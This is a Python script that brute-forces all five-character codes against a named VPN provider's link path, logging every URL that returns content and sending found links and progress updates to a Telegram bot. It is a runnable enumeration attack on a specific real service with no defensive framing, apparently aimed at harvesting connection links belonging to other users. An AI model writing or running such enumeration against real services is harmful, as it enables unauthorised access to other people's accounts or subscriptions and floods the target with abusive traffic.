import requests
import itertools
import string
import telegram
import asyncio
import logging
from datetime import datetime

# Telegram bot setup
BOT_TOKEN = "YOUR_BOT_TOKEN"
USER_ID = "YOUR_USER_ID"
bot = telegram.Bot(token=BOT_TOKEN)

# Logging setup
logging.basicConfig(filename='found_codes.log', level=logging.INFO, format='%(asctime)s - %(message)s')

# Character set for 5-digit code (letters and digits)
CHARS = string.ascii_lowercase + string.digits
TOTAL_COMBINATIONS = len(CHARS) ** 5
BASE_URL = "https://connect.realityvpn.ru:2097/r/"

# Progress tracking
checked = 0
found_urls = []

async def send_telegram_message(message):
    await bot.send_message(chat_id=USER_ID, text=message)

def check_url(code):
    global checked
    url = f"{BASE_URL}{code}"
    try:
        response = requests.get(url, timeout=5)
        if response.status_code == 200 and response.text.strip():
            logging.info(f"Found valid URL: {url}")
            found_urls.append(url)
            asyncio.run(send_telegram_message(f"Found valid URL: {url}"))
            return True
        return False
    except requests.RequestException:
        return False

def brute_force():
    global checked
    for code_tuple in itertools.product(CHARS, repeat=5):
        code = ''.join(code_tuple)
        check_url(code)
        checked += 1
        if checked % 1000 == 0:  # Update progress every 1000 checks
            progress = (checked / TOTAL_COMBINATIONS) * 100
            asyncio.run(send_telegram_message(f"Progress: {progress:.2f}%"))

def get_progress():
    progress = (checked / TOTAL_COMBINATIONS) * 100
    return f"Progress: {progress:.2f}%"

def get_found_urls():
    return "\n".join(found_urls) if found_urls else "No valid URLs found."

if __name__ == "__main__":
    try:
        brute_force()
    except KeyboardInterrupt:
        print(get_progress())
        print(get_found_urls())